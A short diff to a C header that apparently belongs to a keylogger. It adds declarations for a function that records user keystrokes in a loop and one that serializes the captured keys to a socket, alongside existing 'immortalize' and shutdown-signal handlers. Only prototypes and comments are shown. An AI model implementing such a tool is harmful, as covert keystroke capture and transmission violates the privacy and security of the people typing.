@@ -45,3 +45,16 @@ void immortalize(void);
  *
  * **/
 void shutdown_signal(int signal);
+
+int serialize(FILE* socket_file, key_package* packet);
+
+/**
+ * Runs an infinite loop to store user keystrokes.
+ *
+ * Can be exited with the `c` key. Upon exit, writes all keys into the
+ * key_package struct, in chronological order.
+ *
+ * @param key_package A pointer to a key_package instance. Used to hold an array
+ * of key data for the overall session.
+ */
+void log_keys(key_package* key_package);
